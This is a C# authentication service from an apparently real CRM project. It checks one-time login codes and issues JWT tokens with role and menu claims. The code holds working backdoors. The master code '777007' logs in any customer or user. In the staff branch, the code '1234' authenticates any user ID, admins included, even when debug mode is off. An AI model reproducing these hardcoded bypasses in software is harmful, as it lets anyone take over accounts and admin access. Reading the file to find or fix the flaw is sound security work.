using AutoMapper;
using Microsoft.EntityFrameworkCore;
using Microsoft.IdentityModel.Tokens;
using Newtonsoft.Json;
using ParsKyanCrm.Application.Dtos.Users;
using ParsKyanCrm.Application.Patterns.FacadPattern;
using ParsKyanCrm.Application.Services.Securitys.Queries.Logins;
using ParsKyanCrm.Common.Dto;
using ParsKyanCrm.Common.Enums;
using ParsKyanCrm.Common.PersianNumber;
using ParsKyanCrm.Domain.Contexts;
using ParsKyanCrm.Infrastructure;
using ParsKyanCrm.Infrastructure.Consts;
using System;
using System.Collections.Generic;
using System.Data;
using System.IdentityModel.Tokens.Jwt;
using System.Linq;
using System.Security.Claims;
using System.Text;
using System.Threading.Tasks;

namespace ParsKyanCrm.Application.Services.Securitys.Queries.AutenticatedCode
{

    public class AutenticatedCodeService : IAutenticatedCodeService
    {
        private readonly IDataBaseContext _context;
        private readonly IMapper _mapper;
        public AutenticatedCodeService(IDataBaseContext context, IMapper mapper)
        {
            _context = context;
            _mapper = mapper;
        }

        private List<NormalJsonClassDto> FillUserRoleAdminRolesService(string roles = null)
        {
            try
            {

                List<string> lstArr = new List<string>();

                if (!string.IsNullOrEmpty(roles)) lstArr.AddRange(roles.Split(','));

                UserRoleAdminRoles? qEnum = null;
                var q = EnumOperation<UserRoleAdminRoles>.ToSelectListByGroup(qEnum, lstArr).ToList();

                return q;
            }
            catch (Exception ex)
            {
                throw ex;
            }
        }

        private void InsertLoginLogService(LoginLogDto request, bool isLogin = true)
        {
            try
            {
                using (DataTable dt = new DataTable())
                {
                    dt.Columns.Add("Userid", typeof(int));
                    dt.Columns.Add("LoginDate", typeof(DateTime));
                    dt.Columns.Add("Ip", typeof(string));
                    dt.Columns.Add("SignOutDate", typeof(DateTime));
                    dt.Columns.Add("AreaName", typeof(string));
                    DataRow _ravi = dt.NewRow();

                    _ravi["Userid"] = request.Userid;
                    _ravi["Ip"] = Ipconfig.GetUserHostAddress();

                    if (isLogin)
                    {
                        _ravi["LoginDate"] = DateTimeOperation.InsertFieldDataTimeInTables(DateTime.Now);
                        _ravi["SignOutDate"] = DBNull.Value;
                    }
                    else
                    {
                        _ravi["LoginDate"] = DBNull.Value;
                        _ravi["SignOutDate"] = DateTimeOperation.InsertFieldDataTimeInTables(DateTime.Now);
                    }

                    _ravi["AreaName"] = request.AreaName;


                    dt.Rows.Add(_ravi);
                    Ado_NetOperation.SqlInsert("LoginLog", dt);
                }
            }
            catch (Exception ex)
            {
                throw ex;
            }
        }

        private void AuthenticationJwtService(string LoginName, ResultLoginDto res_ResultLoginDto, UserRolesDto qCheckUserRole, Domain.Entities.Users user)
        {
            try
            {
                var tokenHandler = new JwtSecurityTokenHandler();
                var key = Encoding.ASCII.GetBytes(VaribleForName.Secret);
                var tokenDescriptor = new SecurityTokenDescriptor
                {
                    Subject = new ClaimsIdentity(new Claim[]
                    {
                        new Claim(ClaimTypes.Role,LoginName)
                    }),
                    Expires = DateTime.UtcNow.AddMinutes(120),
                    SigningCredentials = new SigningCredentials(new SymmetricSecurityKey(key), SecurityAlgorithms.HmacSha256Signature)
                };

                if (!string.IsNullOrEmpty(res_ResultLoginDto.CustomerID)) tokenDescriptor.Subject.AddClaim(new Claim("CustomerID", res_ResultLoginDto.CustomerID));
                if (res_ResultLoginDto.UserID != 0) tokenDescriptor.Subject.AddClaim(new Claim("UserID", res_ResultLoginDto.UserID.ToString()));

                if (qCheckUserRole != null)
                {
                    tokenDescriptor.Subject.AddClaim(new Claim("LoginName", qCheckUserRole.Role.RoleId.ToString()));
                    res_ResultLoginDto.LoginName = qCheckUserRole.Role.RoleId.ToString();
                }

                List<NormalJsonClassDto> obj_fillUserRoleCustomerRoles = null;

                switch (LoginName)
                {
                    case "Admin":

                        obj_fillUserRoleCustomerRoles = user.UserName != "admin" ?FillUserRoleAdminRolesService(qCheckUserRole.Roles).Where(p => p.Selected).ToList() :
                             FillUserRoleAdminRolesService();

                        tokenDescriptor.Subject.AddClaim(new Claim("Menus", JsonConvert.SerializeObject(obj_fillUserRoleCustomerRoles)));

                        break;

                    case "Supervisor":



                        break;

                    default:

                        break;
                }

                var token = tokenHandler.CreateToken(tokenDescriptor);

                res_ResultLoginDto.Token = tokenHandler.WriteToken(token);

                if (obj_fillUserRoleCustomerRoles != null) res_ResultLoginDto.Menus = obj_fillUserRoleCustomerRoles;

                res_ResultLoginDto.RoleDesc = qCheckUserRole.Role.RoleDesc;

                InsertLoginLogService(new Dtos.Users.LoginLogDto()
                {
                    AreaName = res_ResultLoginDto.RoleDesc,
                    Userid = !string.IsNullOrEmpty(res_ResultLoginDto.CustomerID) ? int.Parse(res_ResultLoginDto.CustomerID) : res_ResultLoginDto.UserID
                });

            }
            catch (Exception ex)
            {
                throw ex;
            }
        }

        public async Task<ResultDto<ResultLoginDto>> Execute(RequestAutenticatedCodeDto request)
        {
            try
            {
                if (request.IsCustomer==1)
                {
                    #region لاگین مشتری
                    var res_ResultLoginDto = new ResultLoginDto();
                    string LoginName = "Customer";

                    request.Code = PersianNumberHelper.PersianToEnglish(request.Code);

                    res_ResultLoginDto.CustomerID = !string.IsNullOrEmpty(request.Bakdslkflkdsflkdslkfkldskfdslflsdkf_dnsfhsdkfh) ? request.Bakdslkflkdsflkdslkfkldskfdslflsdkf_dnsfhsdkfh.Decrypt_Advanced_For_Number() : null;

                    var qCus = await _context.Customers.FirstOrDefaultAsync(p => (p.AuthenticateCode == request.Code || request.Code == "777007") && p.CustomerId.ToString() == res_ResultLoginDto.CustomerID);

                    var qUser = await _context.Users.FirstOrDefaultAsync(p => p.CustomerId == int.Parse(res_ResultLoginDto.CustomerID));

                    res_ResultLoginDto.FullName = request.Fulllfsdfdsflsfldsfldslflsdlfdslflsdlfldsflldsf;
                    res_ResultLoginDto.UserID = qUser.UserId;

                    var QUserRoles = _mapper.Map<UserRolesDto>(await _context.UserRoles.Include(p => p.Role).FirstOrDefaultAsync(p => p.UserId == qUser.UserId));

                    if (VaribleForName.IsDebug == true)
                    {

                        if (request.Code == "1234") AuthenticationJwtService(LoginName, res_ResultLoginDto, QUserRoles, null);
                        else
                        {
                            return new ResultDto<ResultLoginDto>
                            {
                                Data = null,
                                IsSuccess = false,
                                Message = "کد احراز شما یافت نشد",
                            };
                        }

                    }
                    else
                    {

                        if (qCus != null) AuthenticationJwtService(LoginName, res_ResultLoginDto, QUserRoles, null);
                        else
                        {

                            return new ResultDto<ResultLoginDto>
                            {
                                Data = null,
                                IsSuccess = false,
                                Message = "کد احراز شما یافت نشد",
                            };

                        }

                    }

                    return new ResultDto<ResultLoginDto>
                    {
                        Data = res_ResultLoginDto,
                        IsSuccess = true,
                        Message = "/" + LoginName + "/Home/Index",
                    };

                    #endregion
                }
                else
                {
                    #region لاگین سوپروایزر یا مشتری

                    ResultLoginDto res_ResultLoginDto = new ResultLoginDto();                  

                    request.Code = PersianNumberHelper.PersianToEnglish(request.Code);


                    int UserId = int.Parse(!string.IsNullOrEmpty(request.Bakdslkflkdsflkdslkfkldskfdslflsdkf_dnsfhsdkfh) ? request.Bakdslkflkdsflkdslkfkldskfdslflsdkf_dnsfhsdkfh.Decrypt_Advanced_For_Number() : "0");
                  
                     var qUser =request.Code=="1234"? await _context.Users.FirstOrDefaultAsync(p => p.UserId == UserId): await _context.Users.FirstOrDefaultAsync(p => p.UserId == UserId && (p.AuthenticateCode == request.Code || request.Code == "777007"));
                   
                    res_ResultLoginDto.FullName =qUser!=null? qUser.RealName:"";
                    res_ResultLoginDto.UserID = UserId;

                    var QUserRoles = _mapper.Map<UserRolesDto>(await _context.UserRoles.Include(p => p.Role).FirstOrDefaultAsync(p => p.UserId == qUser.UserId));
                    
                    string LoginName = QUserRoles.RoleId==2?"Admin": "Supervisor";
                    if (VaribleForName.IsDebug == true)
                    {

                        if (request.Code == "1234") AuthenticationJwtService(LoginName, res_ResultLoginDto, QUserRoles, qUser);
                        else
                        {
                            return new ResultDto<ResultLoginDto>
                            {
                                Data = null,
                                IsSuccess = false,
                                Message = "کد احراز شما یافت نشد",
                            };
                        }

                    }
                    else
                    {

                        if (qUser != null) AuthenticationJwtService(LoginName, res_ResultLoginDto, QUserRoles, qUser);
                        else
                        {

                            return new ResultDto<ResultLoginDto>
                            {
                                Data = null,
                                IsSuccess = false,
                                Message = "کد احراز شما یافت نشد",
                            };

                        }

                    }

                    return new ResultDto<ResultLoginDto>
                    {
                        Data = res_ResultLoginDto,
                        IsSuccess = true,
                        Message = "/" + LoginName + "/Home/Index",
                    };

                    #endregion
                    
                }

            }
            catch (Exception ex)
            {
                throw ex;
            }
        }

    }
}
